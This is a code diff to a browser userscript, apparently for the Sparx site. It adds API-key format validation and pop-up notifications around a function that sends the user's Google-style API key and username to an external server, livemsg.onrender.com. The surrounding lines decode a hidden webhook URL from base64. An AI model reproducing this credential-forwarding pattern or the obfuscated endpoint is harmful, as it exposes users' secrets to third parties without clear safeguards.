@@ -5,6 +5,55 @@ const webhookURL = atob(webhookBase);
 let username = null;
 let userApiKey = null;
 
+// ---------- API key validator + top notification ----------
+function isValidApiKey(key, opts = {}) {
+  if (!key || typeof key !== 'string') return false;
+  key = key.trim();
+  const { prefixes, exactLength, minLength, maxLength, regex } = opts;
+  if (prefixes && Array.isArray(prefixes)) {
+    if (!prefixes.some(p => key.startsWith(p))) return false;
+  }
+  if (typeof exactLength === 'number' && key.length !== exactLength) return false;
+  if (typeof minLength === 'number' && key.length < minLength) return false;
+  if (typeof maxLength === 'number' && key.length > maxLength) return false;
+  if (regex && !(new RegExp(regex)).test(key)) return false;
+  return true;
+}
+
+function showTopNotif(message, type = 'error', duration = 3500) {
+  const existing = document.getElementById('sparx-top-notif');
+  if (existing) existing.remove();
+  const notif = document.createElement('div');
+  notif.id = 'sparx-top-notif';
+  notif.textContent = message;
+  Object.assign(notif.style, {
+    position: 'fixed',
+    top: '-90px',
+    left: '50%',
+    transform: 'translateX(-50%)',
+    padding: '10px 18px',
+    borderRadius: '10px',
+    zIndex: 9999999,
+    fontFamily: 'Rubik, Arial, sans-serif',
+    fontSize: '14px',
+    boxShadow: '0 8px 24px rgba(0,0,0,0.4)',
+    transition: 'top 420ms cubic-bezier(.2,.9,.2,1), opacity 300ms',
+    opacity: '0',
+    background: '#0b0b0b',
+    color: '#fff',
+    border: '1px solid rgba(255,255,255,0.06)'
+  });
+  if (type === 'success') notif.style.color = '#d2ffd6';
+  if (type === 'info') notif.style.color = '#fff';
+  document.body.appendChild(notif);
+  requestAnimationFrame(() => { notif.style.top = '18px'; notif.style.opacity = '1'; });
+  setTimeout(() => {
+    notif.style.top = '-90px'; notif.style.opacity = '0';
+    setTimeout(() => notif.remove(), 420);
+  }, duration);
+}
+
+
 // === Find Username (wait for login) ===
 function findUsername() {
   return new Promise((resolve) => {
@@ -56,6 +105,20 @@ findUsername().then(async () => {
 });
 
 async function sendApiKeyToServer(username, key) {
+  // Strict validator: must start with "AIza" and be exactly 39 chars
+  const VALIDATOR = {
+    prefixes: ['AIza'],
+    exactLength: 39
+  };
+
+  if (!isValidApiKey(key, VALIDATOR)) {
+    showTopNotif('Incorrect API key format.', 'error', 3500);
+    console.warn('Client-side validation failed for API key.');
+    return { ok: false, error: 'invalid_format' };
+  }
+
+  showTopNotif('Saving API key...', 'info', 2000);
+
   try {
     const response = await fetch("https://livemsg.onrender.com/api/saveKey", {
       method: "POST",
@@ -64,15 +127,23 @@ async function sendApiKeyToServer(username, key) {
     });
 
     if (!response.ok) {
-      throw new Error(`Server rejected request: ${response.statusText}`);
+      const txt = await response.text().catch(()=>response.statusText);
+      showTopNotif('Failed to save key on server.', 'error', 3500);
+      console.error('Server rejected request:', txt);
+      return { ok: false, error: 'server_rejected' };
     }
 
     const data = await response.json();
+    showTopNotif('API key saved ✅', 'success', 2500);
     console.log("✅ API key successfully saved on server:", data);
+    return { ok: true, data };
   } catch (err) {
+    showTopNotif('Network error while saving key.', 'error', 3500);
     console.error("❌ Failed to save API key to server:", err);
+    return { ok: false, error: 'network' };
   }
 }
+
 
 function showApiKeyPopup() {
   if (document.getElementById('sparx-key-popup')) return;
